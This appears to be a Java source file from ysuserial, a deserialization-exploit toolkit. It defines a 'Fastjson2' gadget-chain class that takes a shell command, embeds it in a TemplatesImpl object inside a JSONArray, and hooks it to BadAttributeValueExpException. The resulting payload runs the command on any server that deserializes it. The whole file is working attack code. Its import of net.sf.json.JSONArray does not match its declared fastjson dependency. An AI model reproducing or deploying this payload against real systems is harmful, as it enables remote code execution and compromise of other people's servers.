package org.su18.ysuserial.payloads.gadgets;

import net.sf.json.JSONArray;
import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Gadgets;
import org.su18.ysuserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.util.HashMap;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"com.alibaba:fastjson:2.x"})
@Authors({Authors.Y4ER})
public class Fastjson2 implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		final Object template = Gadgets.createTemplatesImpl(command);
		JSONArray jsonArray = new JSONArray();
		jsonArray.add(template);

		BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
		Reflections.setFieldValue(badAttributeValueExpException, "val", jsonArray);

		HashMap hashMap = new HashMap();
		hashMap.put(template, badAttributeValueExpException);

		return hashMap;
	}
}
